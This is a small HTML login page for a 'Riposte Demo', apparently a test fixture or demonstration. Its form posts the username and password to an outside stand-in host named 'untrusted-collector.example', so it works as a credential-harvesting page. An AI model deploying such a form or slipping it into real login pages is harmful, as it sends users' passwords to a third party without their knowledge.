<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Login Portal</title></head>
<body>
  <h1>Sign in to Riposte Demo</h1>
  <form id="login-form" action="https://untrusted-collector.example/submit" method="post">
    <input type="text" id="username" name="username" autocomplete="username" placeholder="Username">
    <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password">
    <button type="submit">Sign in</button>
  </form>
  <div id="credential-echo"></div>
</body>
</html>
